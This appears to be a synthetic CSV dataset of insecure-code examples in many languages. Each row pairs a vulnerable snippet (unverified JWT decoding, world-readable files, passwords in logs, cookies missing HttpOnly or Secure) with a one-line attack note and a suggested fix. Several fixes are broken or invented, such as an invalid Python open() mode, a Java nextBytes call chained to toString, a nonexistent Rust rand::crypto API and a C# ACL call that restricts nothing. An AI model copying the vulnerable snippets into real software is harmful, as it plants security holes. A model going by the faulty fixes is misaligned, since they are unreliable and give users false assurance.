vuln-688,C# (.NET),Insecure HTTP Method Handling,Allowing unsafe HTTP methods.,"[HttpAny(""/api"")] public IActionResult Handle() { ... }",Use TRACE or PUT to bypass controls.,"Restrict: [HttpGet(""/api""), HttpPost(""/api"")]","[HttpAny(""/api"")] public IActionResult Handle() { ... }",False,False,False,False,55,False,True,False,Other,1
vuln-689,Kotlin,Insecure HTTP Method Handling,Allowing all HTTP methods.,"route(""/api"") { handle { handleRequest(call) } }",Exploit TRACE or PUT methods.,"Restrict: get(""/api"") { ... }; post(""/api"") { ... }","route(""/api"") { handle { handleRequest(call) } }",False,False,False,False,48,False,True,False,Other,1
vuln-690,Scala,Insecure HTTP Method Handling,Allowing unsafe HTTP methods.,"pathPrefix(""api"") { handleRequest }",Use TRACE or PUT to bypass restrictions.,"Restrict: get { pathPrefix(""api"") { ... } } ~ post { pathPrefix(""api"") { ... } }","pathPrefix(""api"") { handleRequest }",False,False,False,False,35,False,True,False,Other,1
vuln-691,Rust,Insecure HTTP Method Handling,Allowing all HTTP methods.,"router.any(""/api"", handle_request)",Exploit TRACE or PUT methods.,"Restrict: router.get(""/api"", handle_request).post(""/api"", handle_request)","router.any(""/api"", handle_request)",False,False,False,False,34,False,True,False,Other,1
vuln-692,Elixir,Insecure HTTP Method Handling,Allowing unsafe HTTP methods.,"match :*, ""/api"", ApiController, :handle",Use TRACE or PUT to bypass controls.,"Restrict: get ""/api"", ApiController, :handle; post ""/api"", ApiController, :handle","match :*, ""/api"", ApiController, :handle",False,False,False,False,40,False,True,False,Other,1
vuln-693,Perl,Insecure HTTP Method Handling,Allowing all HTTP methods.,if ($r->uri =~ /^/api/) { handle_request($r); },Exploit TRACE or PUT methods.,Restrict: if ($r->method =~ /^(GET|POST)$/) { handle_request($r); },if ($r->uri =~ /^/api/) { handle_request($r); },False,False,False,False,47,False,False,False,Other,1
vuln-694,Node.js,Insecure Error Handling,Exposing stack traces in production.,"app.use((err, req, res, next) => res.status(500).send(err.stack));",Extract sensitive info from stack traces.,Hide details: res.status(500).send('Internal Server Error'),"app.use((err, req, res, next) => res.status(500).send(err.stack));",False,False,False,False,66,False,False,False,Other,1
vuln-695,Python,Insecure Error Handling,Leaking stack traces in responses.,"@app.errorhandler(Exception) def handle_error(e): return str(e), 500",Gain insights from stack traces.,"Hide: return 'Internal Server Error', 500","@app.errorhandler(Exception) def handle_error(e): return str(e), 500",False,False,False,False,68,False,False,False,Other,1
vuln-696,Java,Insecure Error Handling,Exposing stack traces in production.,@ExceptionHandler(Exception.class) public ResponseEntity<?> handle(Exception e) { return ResponseEntity.status(500).body(e.getStackTrace()); },Extract sensitive data from stack traces.,"Hide: return ResponseEntity.status(500).body(""Internal Server Error"")",@ExceptionHandler(Exception.class) public ResponseEntity<?> handle(Exception e) { return ResponseEntity.status(500).body(e.getStackTrace()); },True,False,False,False,142,False,False,False,Other,1
vuln-697,PHP,Insecure Error Handling,Leaking stack traces in responses.,"set_error_handler(function($errno, $errstr) { echo $errstr; });",Gain insights from error details.,Hide: echo 'Internal Server Error';,"set_error_handler(function($errno, $errstr) { echo $errstr; });",False,False,False,False,63,False,False,False,Other,1
vuln-698,Ruby,Insecure Error Handling,Exposing stack traces in production.,"rescue_from Exception do |e| render text: e.backtrace.join(""\n"") end",Extract sensitive info from stack traces.,"Hide: render text: 'Internal Server Error', status: 500","rescue_from Exception do |e| render text: e.backtrace.join(""\n"") end",False,False,False,False,68,False,True,False,Other,1
vuln-699,Go,Insecure Error Handling,Leaking error details in responses.,"http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { panic(""error"") })",Gain insights from error messages.,"Hide: http.Error(w, ""Internal Server Error"", http.StatusInternalServerError)","http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { panic(""error"") })",False,False,False,False,85,False,True,False,Other,1
vuln-700,C# (.NET),Insecure Error Handling,Exposing stack traces in production.,app.UseExceptionHandler(errorApp => errorApp.Run(async context => await context.Response.WriteAsync(context.Exception.StackTrace)));,Extract sensitive data from stack traces.,"Hide: await context.Response.WriteAsync(""Internal Server Error"")",app.UseExceptionHandler(errorApp => errorApp.Run(async context => await context.Response.WriteAsync(context.Exception.StackTrace)));,False,False,False,False,132,False,False,False,Other,1
vuln-701,Kotlin,Insecure Error Handling,Exposing stack traces in production responses.,"exception<Exception> { call.respond(HttpStatusCode.InternalServerError, it.stackTraceToString()) }",Extract sensitive information from stack traces.,"Hide details: call.respond(HttpStatusCode.InternalServerError, ""Internal Server Error"")","exception<Exception> { call.respond(HttpStatusCode.InternalServerError, it.stackTraceToString()) }",False,False,False,False,98,False,False,False,Other,1
vuln-702,Scala,Insecure Error Handling,Leaking stack traces in production.,"onFailure { case e: Exception => InternalServerError(e.getStackTrace.mkString(""\n"")) }",Gain insights from stack traces.,"Hide: InternalServerError(""Internal Server Error"")","onFailure { case e: Exception => InternalServerError(e.getStackTrace.mkString(""\n"")) }",False,False,False,False,86,False,True,False,Other,1
vuln-703,Rust,Insecure Error Handling,Exposing error details in responses.,"router.get(""/"", |_, res| res.render_text(format!(""{:?}"", panic!(""error""))))",Extract sensitive data from error messages.,"Hide: res.status(StatusCode::INTERNAL_SERVER_ERROR).render_text(""Internal Server Error"")","router.get(""/"", |_, res| res.render_text(format!(""{:?}"", panic!(""error""))))",False,False,False,False,75,False,True,False,Other,1
vuln-704,Elixir,Insecure Error Handling,Leaking stack traces in production.,"plug :error_handler; def error_handler(conn, %{reason: reason}) do send_resp(conn, 500, inspect(reason)) end",Gain insights from stack traces.,"Hide: send_resp(conn, 500, ""Internal Server Error"")","plug :error_handler; def error_handler(conn, %{reason: reason}) do send_resp(conn, 500, inspect(reason)) end",False,False,False,False,108,False,False,False,Other,1
vuln-705,Perl,Insecure Error Handling,Exposing stack traces in responses.,"eval { die ""error""; }; $r->print($@) if $@;",Extract sensitive info from stack traces.,Hide: $r->print('Internal Server Error') if $@;,"eval { die ""error""; }; $r->print($@) if $@;",False,False,False,True,43,False,True,False,Other,1
vuln-706,Node.js,Insecure Cookie Configuration,Cookies without HttpOnly flag.,"res.cookie('session', token);",Steal cookies via XSS.,"Set HttpOnly: res.cookie('session', token, { httpOnly: true })","res.cookie('session', token);",False,False,False,False,29,False,True,False,Configuration,1
vuln-707,Python,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"response.set_cookie('session', token)",Access cookies via XSS.,"Set: response.set_cookie('session', token, httponly=True)","response.set_cookie('session', token)",False,False,False,False,37,False,True,False,Configuration,1
vuln-708,Java,Insecure Cookie Configuration,Cookies without HttpOnly flag.,"Cookie cookie = new Cookie(""session"", token); response.addCookie(cookie);",Steal cookies via XSS.,Set: cookie.setHttpOnly(true); response.addCookie(cookie);,"Cookie cookie = new Cookie(""session"", token); response.addCookie(cookie);",False,False,False,False,73,False,True,False,Configuration,1
vuln-709,PHP,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"setcookie('session', $token);",Access cookies via XSS.,"Set: setcookie('session', $token, ['httponly' => true]);","setcookie('session', $token);",False,False,False,False,29,False,True,False,Configuration,1
vuln-710,Ruby,Insecure Cookie Configuration,Cookies without HttpOnly flag.,cookies[:session] = token,Steal cookies via XSS.,"Set: cookies[:session] = { value: token, httponly: true }",cookies[:session] = token,False,False,False,False,25,False,False,False,Configuration,1
vuln-711,Go,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token})",Access cookies via XSS.,"Set: http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token, HttpOnly: true})","http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token})",False,False,False,False,62,False,True,False,Configuration,1
vuln-712,C# (.NET),Insecure Cookie Configuration,Cookies without HttpOnly flag.,"Response.Cookies.Append(""session"", token);",Steal cookies via XSS.,"Set: Response.Cookies.Append(""session"", token, new CookieOptions { HttpOnly = true });","Response.Cookies.Append(""session"", token);",False,False,False,False,42,False,True,False,Configuration,1
vuln-713,Kotlin,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"call.response.cookies.append(""session"", token)",Access cookies via XSS.,"Set: call.response.cookies.append(""session"", token, httpOnly = true)","call.response.cookies.append(""session"", token)",False,False,False,False,46,False,True,False,Configuration,1
vuln-714,Scala,Insecure Cookie Configuration,Cookies without HttpOnly flag.,"Ok.withCookies(Cookie(""session"", token))",Steal cookies via XSS.,"Set: Ok.withCookies(Cookie(""session"", token, httpOnly = true))","Ok.withCookies(Cookie(""session"", token))",False,False,False,False,40,False,True,False,Configuration,1
vuln-715,Rust,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"res.cookie(Cookie::new(""session"", token))",Access cookies via XSS.,"Set: res.cookie(Cookie::new(""session"", token).http_only(true))","res.cookie(Cookie::new(""session"", token))",False,False,False,False,41,False,True,False,Configuration,1
vuln-716,Elixir,Insecure Cookie Configuration,Cookies without HttpOnly flag.,"put_resp_cookie(conn, ""session"", token)",Steal cookies via XSS.,"Set: put_resp_cookie(conn, ""session"", token, http_only: true)","put_resp_cookie(conn, ""session"", token)",False,False,False,False,39,False,True,False,Configuration,1
vuln-717,Perl,Insecure Cookie Configuration,Cookies missing HttpOnly flag.,"$r->headers_out->set('Set-Cookie' => ""session=$token"");",Access cookies via XSS.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly"");","$r->headers_out->set('Set-Cookie' => ""session=$token"");",False,False,False,False,55,False,True,False,Configuration,1
vuln-718,Node.js,Insecure Cookie Scope,Cookies without Secure flag.,"res.cookie('session', token, { httpOnly: true });",Intercept cookies over HTTP.,"Set Secure: res.cookie('session', token, { httpOnly: true, secure: true })","res.cookie('session', token, { httpOnly: true });",False,False,False,False,49,False,True,False,Other,1
vuln-719,Python,Insecure Cookie Scope,Cookies missing Secure flag.,"response.set_cookie('session', token, httponly=True)",Steal cookies over non-HTTPS connections.,"Set: response.set_cookie('session', token, httponly=True, secure=True)","response.set_cookie('session', token, httponly=True)",False,False,False,False,52,False,True,False,Other,1
vuln-720,Java,Insecure Cookie Scope,Cookies without Secure flag.,"Cookie cookie = new Cookie(""session"", token); cookie.setHttpOnly(true); response.addCookie(cookie);",Intercept cookies over HTTP.,Set: cookie.setSecure(true); response.addCookie(cookie);,"Cookie cookie = new Cookie(""session"", token); cookie.setHttpOnly(true); response.addCookie(cookie);",False,False,False,False,99,False,True,False,Other,1
vuln-721,PHP,Insecure Cookie Scope,Cookies missing Secure flag.,"setcookie('session', $token, ['httponly' => true]);",Steal cookies over HTTP.,"Set: setcookie('session', $token, ['httponly' => true, 'secure' => true]);","setcookie('session', $token, ['httponly' => true]);",False,False,False,False,51,False,True,False,Other,1
vuln-722,Ruby,Insecure Cookie Scope,Cookies without Secure flag.,"cookies[:session] = { value: token, httponly: true }",Intercept cookies over non-HTTPS.,"Set: cookies[:session] = { value: token, httponly: true, secure: true }","cookies[:session] = { value: token, httponly: true }",False,False,False,False,52,False,False,False,Other,1
vuln-723,Go,Insecure Cookie Scope,Cookies missing Secure flag.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token, HttpOnly: true})",Steal cookies over HTTP.,"Set: http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token, HttpOnly: true, Secure: true})","http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token, HttpOnly: true})",False,False,False,False,78,False,True,False,Other,1
vuln-724,C# (.NET),Insecure Cookie Scope,Cookies without Secure flag.,"Response.Cookies.Append(""session"", token, new CookieOptions { HttpOnly = true });",Intercept cookies over HTTP.,"Set: Response.Cookies.Append(""session"", token, new CookieOptions { HttpOnly = true, Secure = true });","Response.Cookies.Append(""session"", token, new CookieOptions { HttpOnly = true });",False,False,False,False,81,False,True,False,Other,1
vuln-725,Kotlin,Insecure Cookie Scope,Cookies missing Secure flag.,"call.response.cookies.append(""session"", token, httpOnly = true)",Steal cookies over non-HTTPS.,"Set: call.response.cookies.append(""session"", token, httpOnly = true, secure = true)","call.response.cookies.append(""session"", token, httpOnly = true)",False,False,False,False,63,False,True,False,Other,1
vuln-726,Scala,Insecure Cookie Scope,Cookies without Secure flag.,"Ok.withCookies(Cookie(""session"", token, httpOnly = true))",Intercept cookies over HTTP.,"Set: Ok.withCookies(Cookie(""session"", token, httpOnly = true, secure = true))","Ok.withCookies(Cookie(""session"", token, httpOnly = true))",False,False,False,False,57,False,True,False,Other,1
vuln-727,Rust,Insecure Cookie Scope,Cookies missing Secure flag.,"res.cookie(Cookie::new(""session"", token).http_only(true))",Steal cookies over HTTP.,"Set: res.cookie(Cookie::new(""session"", token).http_only(true).secure(true))","res.cookie(Cookie::new(""session"", token).http_only(true))",False,False,False,False,57,False,True,False,Other,1
vuln-728,Elixir,Insecure Cookie Scope,Cookies without Secure flag.,"put_resp_cookie(conn, ""session"", token, http_only: true)",Intercept cookies over non-HTTPS.,"Set: put_resp_cookie(conn, ""session"", token, http_only: true, secure: true)","put_resp_cookie(conn, ""session"", token, http_only: true)",False,False,False,False,56,False,True,False,Other,1
vuln-729,Perl,Insecure Cookie Scope,Cookies missing Secure flag.,"$r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly"");",Steal cookies over HTTP.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly; Secure"");","$r->headers_out->set('Set-Cookie' => ""session=$token; HttpOnly"");",False,False,False,False,65,False,True,False,Other,1
vuln-730,Node.js,Insecure JWT Handling,Accepting JWTs without signature verification.,const payload = jwt.decode(token);,Forge JWTs without signature checks.,"Verify: jwt.verify(token, secretKey)",const payload = jwt.decode(token);,False,False,False,False,34,False,False,False,Other,1
vuln-731,Python,Insecure JWT Handling,Decoding JWTs without verifying signatures.,"payload = jwt.decode(token, options={'verify_signature': False})",Craft malicious JWTs.,"Verify: jwt.decode(token, key=secret, algorithms=['HS256'])","payload = jwt.decode(token, options={'verify_signature': False})",False,False,False,False,64,False,True,False,Other,1
vuln-732,Java,Insecure JWT Handling,Parsing JWTs without signature validation.,DecodedJWT jwt = JWT.decode(token);,Forge JWTs to bypass auth.,Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token),DecodedJWT jwt = JWT.decode(token);,False,False,False,False,35,False,False,False,Other,1
vuln-733,PHP,Insecure JWT Handling,Decoding JWTs without verifying signatures.,"$payload = JWT::decode($token, null);",Craft forged JWTs.,"Verify: JWT::decode($token, new Key($secret, 'HS256'))","$payload = JWT::decode($token, null);",False,False,False,False,37,False,False,False,Other,1
vuln-734,Ruby,Insecure JWT Handling,Accepting JWTs without signature checks.,"payload = JWT.decode(token, nil, false)",Forge JWTs to bypass authentication.,"Verify: JWT.decode(token, secret, true, algorithm: 'HS256')","payload = JWT.decode(token, nil, false)",False,False,False,False,39,False,False,False,Other,1
vuln-735,Go,Insecure JWT Handling,Parsing JWTs without signature verification.,"token, _ := jwt.Parse(tokenString, nil)",Craft malicious JWTs.,"Verify: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return secretKey, nil })","token, _ := jwt.Parse(tokenString, nil)",False,False,False,False,39,False,False,False,Other,1
vuln-736,C# (.NET),Insecure JWT Handling,Decoding JWTs without signature validation.,var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,Forge JWTs to bypass auth.,"Verify: new JwtSecurityTokenHandler().ValidateToken(token, validationParameters, out _)",var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,False,False,False,False,60,False,False,False,Other,1
vuln-737,Kotlin,Insecure JWT Handling,Parsing JWTs without signature checks.,val payload = JWT.decode(token),Craft forged JWTs.,Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token),val payload = JWT.decode(token),False,False,False,False,31,False,False,False,Other,1
vuln-738,Scala,Insecure JWT Handling,Decoding JWTs without verifying signatures.,val payload = JWT.decode(token),Forge JWTs to bypass authentication.,Verify: JWT.require(Algorithm.HMAC256(secret)).build.verify(token),val payload = JWT.decode(token),False,False,False,False,31,False,False,False,Other,1
vuln-739,Rust,Insecure JWT Handling,Parsing JWTs without signature validation.,"let claims = jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(&[]), &Validation::new(Algorithm::HS256))",Craft malicious JWTs.,"Verify: jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(secret.as_ref()), &Validation::new(Algorithm::HS256))","let claims = jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(&[]), &Validation::new(Algorithm::HS256))",False,False,False,False,118,False,False,False,Other,1
vuln-740,Elixir,Insecure JWT Handling,Decoding JWTs without signature checks.,"{:ok, payload} = Joken.peek(token)",Forge JWTs to bypass auth.,"Verify: Joken.verify_and_validate(token, signer)","{:ok, payload} = Joken.peek(token)",False,False,False,False,34,False,False,False,Other,1
vuln-741,Perl,Insecure JWT Handling,Parsing JWTs without signature verification.,my $payload = decode_jwt($token);,Craft forged JWTs.,"Verify: decode_jwt($token, $secret)",my $payload = decode_jwt($token);,False,False,False,False,33,False,False,False,Other,1
vuln-742,Node.js,Insecure File Permissions,World-readable sensitive files.,"fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o666 });",Read sensitive data from files.,"Restrict: fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o600 })","fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o666 });",False,False,True,False,78,False,True,False,File_Handling,1
vuln-743,Python,Insecure File Permissions,World-readable sensitive configuration files.,"with open('config.json', 'w', mode=0o666) as f: json.dump(config, f)",Access sensitive file contents.,"Restrict: with open('config.json', 'w', mode=0o600) as f: json.dump(config, f)","with open('config.json', 'w', mode=0o666) as f: json.dump(config, f)",False,False,True,False,68,False,True,False,File_Handling,1
vuln-744,Java,Insecure File Permissions,World-readable sensitive files.,"Files.write(Paths.get(""config.json""), config.getBytes(), StandardOpenOption.CREATE);",Read sensitive data from files.,"Set: Files.setPosixFilePermissions(Paths.get(""config.json""), PosixFilePermissions.fromString(""rw-------""))","Files.write(Paths.get(""config.json""), config.getBytes(), StandardOpenOption.CREATE);",False,False,True,False,84,False,True,False,File_Handling,1
vuln-745,PHP,Insecure File Permissions,World-readable sensitive files.,"file_put_contents('config.json', json_encode($config), FILE_APPEND);",Access sensitive file contents.,"Restrict: chmod('config.json', 0600); file_put_contents('config.json', json_encode($config));","file_put_contents('config.json', json_encode($config), FILE_APPEND);",False,False,False,False,68,False,True,False,File_Handling,1
vuln-746,Ruby,Insecure File Permissions,World-readable sensitive files.,"File.write('config.json', config.to_json, mode: 'w')",Read sensitive data from files.,"Restrict: File.write('config.json', config.to_json, mode: 'w', perm: 0600)","File.write('config.json', config.to_json, mode: 'w')",False,False,False,False,52,False,True,False,File_Handling,1
vuln-747,Go,Insecure File Permissions,World-readable sensitive files.,"os.WriteFile(""config.json"", []byte(config), 0666)",Access sensitive file contents.,"Restrict: os.WriteFile(""config.json"", []byte(config), 0600)","os.WriteFile(""config.json"", []byte(config), 0666)",False,False,True,False,49,False,True,False,File_Handling,1
vuln-748,C# (.NET),Insecure File Permissions,World-readable sensitive files.,"File.WriteAllText(""config.json"", JsonSerializer.Serialize(config));",Read sensitive data from files.,"Restrict: File.SetAccessControl(""config.json"", new FileSecurity(""config.json"", AccessControlSections.All));","File.WriteAllText(""config.json"", JsonSerializer.Serialize(config));",False,False,False,False,67,False,True,False,File_Handling,1
vuln-749,Kotlin,Insecure File Permissions,World-readable sensitive files.,"File(""config.json"").writeText(config.toJson())",Access sensitive file contents.,"Restrict: File(""config.json"").writeText(config.toJson(), permissions = PosixFilePermissions.asFileAttribute(setOf(OWNER_READ, OWNER_WRITE)))","File(""config.json"").writeText(config.toJson())",False,False,False,False,46,False,True,False,File_Handling,1
vuln-750,Scala,Insecure File Permissions,World-readable sensitive files.,"Files.write(Paths.get(""config.json""), config.getBytes)",Read sensitive data from files.,"Restrict: Files.setPosixFilePermissions(Paths.get(""config.json""), PosixFilePermissions.fromString(""rw-------""))","Files.write(Paths.get(""config.json""), config.getBytes)",False,False,False,False,54,False,True,False,File_Handling,1
vuln-751,Rust,Insecure File Permissions,World-readable sensitive files.,"fs::write(""config.json"", config.to_string())?",Access sensitive file contents.,"Restrict: fs::OpenOptions::new().write(true).create(true).mode(0o600).open(""config.json"")?.write_all(config.to_string().as_bytes())?","fs::write(""config.json"", config.to_string())?",False,False,False,False,45,False,True,False,File_Handling,1
vuln-752,Elixir,Insecure File Permissions,World-readable sensitive files.,"File.write(""config.json"", Jason.encode!(config))",Read sensitive data from files.,"Restrict: File.write(""config.json"", Jason.encode!(config), [:write, :exclusive, :mode, 0o600])","File.write(""config.json"", Jason.encode!(config))",False,False,False,False,48,False,True,False,File_Handling,1
vuln-753,Perl,Insecure File Permissions,World-readable sensitive files.,"open(my $fh, '>', 'config.json'); print $fh encode_json($config);",Access sensitive file contents.,"Restrict: open(my $fh, '>', 'config.json'); chmod(0600, 'config.json'); print $fh encode_json($config);","open(my $fh, '>', 'config.json'); print $fh encode_json($config);",False,False,True,False,65,False,True,False,File_Handling,1
vuln-754,Node.js,Insecure Random Number Generation,Using Math.random for cryptographic purposes.,const token = Math.random().toString(36).substring(2);,Predict random values.,Use crypto: crypto.randomBytes(16).toString('hex'),const token = Math.random().toString(36).substring(2);,False,False,False,False,54,False,False,False,Other,1
vuln-755,Python,Insecure Random Number Generation,Using random module for security-critical operations.,"token = ''.join(random.choices(string.ascii_letters, k=32))",Predict random values due to weak PRNG.,Use secrets: secrets.token_hex(16),"token = ''.join(random.choices(string.ascii_letters, k=32))",False,False,False,False,59,False,True,False,Other,1
vuln-756,Java,Insecure Random Number Generation,Using Random instead of SecureRandom.,String token = new Random().nextLong().toString();,Predict random values.,Use: SecureRandom random = new SecureRandom(); random.nextBytes(new byte[16]).toString(),String token = new Random().nextLong().toString();,False,False,False,False,50,False,False,False,Other,1
vuln-757,PHP,Insecure Random Number Generation,Using rand() for cryptographic purposes.,"$token = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 32);",Predict random values.,Use: bin2hex(random_bytes(16)),"$token = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 32);",False,False,False,False,66,False,True,False,Other,1
vuln-758,Ruby,Insecure Random Number Generation,Using rand for security-critical operations.,token = (0...32).map { ('a'..'z').to_a[rand(26)] }.join,Predict random values.,Use: SecureRandom.hex(16),token = (0...32).map { ('a'..'z').to_a[rand(26)] }.join,False,False,False,False,55,False,True,False,Other,1
vuln-759,Go,Insecure Random Number Generation,Using math/rand for cryptographic purposes.,"token := fmt.Sprintf(""%x"", rand.Int63())",Predict random values due to weak PRNG.,"Use: crypto/rand; b := make([]byte, 16); rand.Read(b); hex.EncodeToString(b)","token := fmt.Sprintf(""%x"", rand.Int63())",False,False,False,False,40,False,True,False,Other,1
vuln-760,C# (.NET),Insecure Random Number Generation,Using Random for security-critical operations.,var token = new Random().Next().ToString();,Predict random values.,Use: RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider(); byte[] b = new byte[16]; rng.GetBytes(b); Convert.ToBase64String(b),var token = new Random().Next().ToString();,False,False,False,False,43,False,False,False,Other,1
vuln-761,Kotlin,Insecure Random Number Generation,Using Random for cryptographic purposes.,val token = Random().nextLong().toString(),Predict random values.,Use: SecureRandom().nextBytes(ByteArray(16)).toHex(),val token = Random().nextLong().toString(),False,False,False,False,42,False,False,False,Other,1
vuln-762,Scala,Insecure Random Number Generation,Using scala.util.Random for security-critical operations.,val token = scala.util.Random.nextLong().toString,Predict random values.,Use: java.security.SecureRandom().nextBytes(new Array[Byte](16)).toHex,val token = scala.util.Random.nextLong().toString,False,False,False,False,49,False,False,False,Other,1
vuln-763,Rust,Insecure Random Number Generation,Using rand::thread_rng for cryptographic purposes.,let token = thread_rng().gen::<u64>().to_string();,Predict random values.,Use: rand::crypto::SystemRandom.fill(&mut [0u8; 16]).to_hex(),let token = thread_rng().gen::<u64>().to_string();,False,False,False,False,50,False,False,False,Other,1
vuln-764,Elixir,Insecure Random Number Generation,Using :rand for security-critical operations.,token = :rand.uniform(1_000_000) |> to_string,Predict random values.,Use: :crypto.strong_rand_bytes(16) |> Base.encode16(),token = :rand.uniform(1_000_000) |> to_string,False,False,False,False,45,False,False,False,Other,1
vuln-765,Perl,Insecure Random Number Generation,Using rand for cryptographic purposes.,"my $token = join('', map { ('a'..'z')[rand 26] } 1..32);",Predict random values.,Use: Crypt::Random::Source::random_bytes(16)->hex;,"my $token = join('', map { ('a'..'z')[rand 26] } 1..32);",False,False,False,False,56,False,True,False,Other,1
vuln-766,Node.js,Insecure Logging,Logging sensitive data like passwords.,console.log(`User login: ${req.body.password}`);,Extract sensitive data from logs.,Avoid logging: console.log('User login attempt');,console.log(`User login: ${req.body.password}`);,True,False,False,False,48,False,False,True,Other,1
vuln-767,Python,Insecure Logging,Logging sensitive information.,logging.info(f'User login: {request.form['password']}'),Access sensitive data from logs.,Avoid: logging.info('User login attempt'),logging.info(f'User login: {request.form['password']}'),False,False,False,False,55,False,True,False,Other,1
vuln-768,Java,Insecure Logging,Logging sensitive data like credentials.,"log.info(""User login: "" + request.getParameter(""password""));",Extract credentials from logs.,"Avoid: log.info(""User login attempt"")","log.info(""User login: "" + request.getParameter(""password""));",True,False,False,False,60,False,True,True,Other,1
vuln-769,PHP,Insecure Logging,Logging sensitive data.,error_log('User login: ' . $_POST['password']);,Access sensitive data from logs.,Avoid: error_log('User login attempt');,error_log('User login: ' . $_POST['password']);,False,False,False,False,47,False,True,False,Other,1
vuln-770,Ruby,Insecure Logging,Logging sensitive information.,"Rails.logger.info ""User login: #{params[:password]}""",Extract sensitive data from logs.,Avoid: Rails.logger.info 'User login attempt',"Rails.logger.info ""User login: #{params[:password]}""",True,False,False,False,52,False,True,False,Other,1
vuln-771,Go,Insecure Logging,Logging sensitive data like passwords.,"log.Printf(""User login: %s"", r.FormValue(""password""))",Access credentials from logs.,"Avoid: log.Print(""User login attempt"")","log.Printf(""User login: %s"", r.FormValue(""password""))",False,False,False,False,53,False,True,True,Other,1
vuln-772,C# (.NET),Insecure Logging,Logging sensitive information.,"_logger.LogInformation($""User login: {model.Password}"");",Extract sensitive data from logs.,"Avoid: _logger.LogInformation(""User login attempt"")","_logger.LogInformation($""User login: {model.Password}"");",False,False,False,False,56,False,True,False,Other,1
vuln-773,Kotlin,Insecure Logging,Logging sensitive data like credentials.,"logger.info(""User login: ${call.request.queryParameters[""password""]}"")",Access sensitive data from logs.,"Avoid: logger.info(""User login attempt"")","logger.info(""User login: ${call.request.queryParameters[""password""]}"")",True,True,False,False,70,False,True,True,Other,1
vuln-774,Scala,Insecure Logging,Logging sensitive information.,"logger.info(s""User login: ${params(""password"")}"")",Extract sensitive data from logs.,"Avoid: logger.info(""User login attempt"")","logger.info(s""User login: ${params(""password"")}"")",True,False,False,False,49,False,True,True,Other,1
vuln-775,Rust,Insecure Logging,Logging sensitive data.,"log::info!(""User login: {}"", req.form::<Form>().await?.password);",Access sensitive data from logs.,"Avoid: log::info!(""User login attempt"")","log::info!(""User login: {}"", req.form::<Form>().await?.password);",True,False,False,False,65,False,True,False,Other,1
vuln-776,Elixir,Insecure Logging,Logging sensitive information.,"Logger.info(""User login: #{params[""password""]}"")",Extract sensitive data from logs.,"Avoid: Logger.info(""User login attempt"")","Logger.info(""User login: #{params[""password""]}"")",True,False,False,False,48,False,True,False,Other,1
vuln-777,Perl,Insecure Logging,Logging sensitive data like passwords.,"warn ""User login: "" . $r->param('password');",Access sensitive data from logs.,"Avoid: warn ""User login attempt"";","warn ""User login: "" . $r->param('password');",True,False,False,False,44,False,True,False,Other,1
vuln-778,Node.js,Insecure Session Timeout,No session expiration set.,app.use(session({ secret: 'secret' }));,Reuse old sessions indefinitely.,"Set timeout: session({ secret: 'secret', cookie: { maxAge: 3600000 } })",app.use(session({ secret: 'secret' }));,False,False,False,False,39,False,True,False,Authentication,1
vuln-779,Python,Insecure Session Timeout,Sessions without expiration.,app.config['SESSION_PERMANENT'] = False,Hijack sessions with no expiry.,Set: app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=60),app.config['SESSION_PERMANENT'] = False,False,False,False,False,39,False,True,False,Authentication,1
vuln-780,Java,Insecure Session Timeout,No session timeout configured.,HttpSession session = request.getSession();,Reuse sessions indefinitely.,Set: session.setMaxInactiveInterval(3600);,HttpSession session = request.getSession();,False,False,False,False,43,False,False,False,Authentication,1
vuln-781,PHP,Insecure Session Timeout,Sessions without expiration.,session_start();,Hijack sessions with no timeout.,"Set: ini_set('session.cookie_lifetime', 3600);",session_start();,False,False,False,False,16,False,False,False,Authentication,1
vuln-782,Ruby,Insecure Session Timeout,No session expiration set.,use ActionDispatch::Session::CookieStore,Reuse old sessions.,"Set: use ActionDispatch::Session::CookieStore, expire_after: 1.hour",use ActionDispatch::Session::CookieStore,False,False,False,False,40,False,False,False,Authentication,1
vuln-783,Go,Insecure Session Timeout,Sessions without expiration.,"session := sessions.NewSession(store, ""session"")",Hijack sessions with no expiry.,Set: session.Options.MaxAge = 3600,"session := sessions.NewSession(store, ""session"")",False,False,False,False,48,False,True,False,Authentication,1
vuln-784,C# (.NET),Insecure Session Timeout,No session timeout configured.,services.AddSession();,Reuse sessions indefinitely.,Set: services.AddSession(options => options.IdleTimeout = TimeSpan.FromMinutes(60));,services.AddSession();,False,False,False,False,22,False,False,False,Authentication,1
vuln-785,Kotlin,Insecure Session Timeout,Sessions without expiration.,"install(Sessions) { cookie<UserSession>(""session"") }",Hijack sessions with no timeout.,"Set: cookie<UserSession>(""session"", maxAgeInSeconds = 3600)","install(Sessions) { cookie<UserSession>(""session"") }",False,False,False,False,52,False,True,False,Authentication,1
